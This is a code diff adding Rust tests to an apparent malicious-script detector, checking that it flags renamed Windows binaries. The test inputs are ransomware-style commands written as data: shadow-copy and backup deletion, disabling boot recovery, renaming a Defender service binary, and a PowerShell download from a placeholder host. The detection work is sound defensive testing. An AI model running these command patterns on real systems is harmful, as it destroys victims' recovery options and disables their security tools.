@@ -23243,6 +23243,138 @@ C:\Users\Public\st.tmp /Change /TN "\Microsoft\Windows\Windows Defender\Windows 
     }
 
     #[test]
+    fn copied_pwsh_alias_command_is_scanned_as_manipulated_exec() {
+        let script = br#"copy "C:\Program Files\PowerShell\7\pwsh.exe" "C:\Users\Public\ps7.tmp"
+"C:\Users\Public\ps7.tmp" -NoP -Command "iwr https://copied-pwsh.example/p.ps1 -OutFile p.ps1"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\ps7.tmp"#)
+            )),
+            "renamed pwsh invocation was not tied back to copied alias: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-pwsh.example/p.ps1"
+                        && dst.as_deref() == Some("p.ps1")
+            )),
+            "renamed pwsh command was not scanned as PowerShell: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn defender_security_binary_move_rename_emits_evasion_trait() {
+        let script = b"@echo off\r\n\
+            move C:\\Windows\\System32\\SecurityHealthService.exe C:\\Windows\\System32\\SecurityHealthService.bak\r\n";
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "security-binary-rename"
+                        && target == "SecurityHealthService.exe"
+            )),
+            "security binary move/rename was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_anti_recovery_aliases_emit_traits() {
+        let script = br#"copy C:\Windows\System32\vssadmin.exe C:\Users\Public\vs.tmp
+C:\Users\Public\vs.tmp delete shadows /all /quiet
+copy C:\Windows\System32\bcdedit.exe C:\Users\Public\bc.tmp
+C:\Users\Public\bc.tmp /set recoveryenabled no
+copy C:\Windows\System32\wbadmin.exe C:\Users\Public\wb.tmp
+C:\Users\Public\wb.tmp delete catalog -quiet
+copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp shadowcopy delete
+"#;
+        let report = analyze(script, &Config::default());
+
+        for target in [
+            r#"C:\Users\Public\vs.tmp"#,
+            r#"C:\Users\Public\bc.tmp"#,
+            r#"C:\Users\Public\wb.tmp"#,
+            r#"C:\Users\Public\wm.tmp"#,
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied anti-recovery alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for action in [
+            "vssadmin-delete-shadows",
+            "bcdedit-recoveryenabled-no",
+            "wbadmin-delete",
+            "wmic-shadowcopy-delete",
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::AntiRecovery { action: a } if a == action
+                )),
+                "missing copied anti-recovery action {action}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_enumeration_aliases_emit_traits() {
+        let script = br#"copy C:\Windows\System32\whoami.exe C:\Users\Public\wa.tmp
+C:\Users\Public\wa.tmp /priv
+copy C:\Windows\System32\systeminfo.exe C:\Users\Public\si.tmp
+C:\Users\Public\si.tmp
+copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp cpu get name
+"#;
+        let report = analyze(script, &Config::default());
+
+        for target in [
+            r#"C:\Users\Public\wa.tmp"#,
+            r#"C:\Users\Public\si.tmp"#,
+            r#"C:\Users\Public\wm.tmp"#,
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied enumeration alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for enum_kind in ["whoami-priv", "systeminfo", "wmic-enum"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind: k, .. } if k == enum_kind
+                )),
+                "missing copied Enumeration {enum_kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn copied_mshta_alias_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
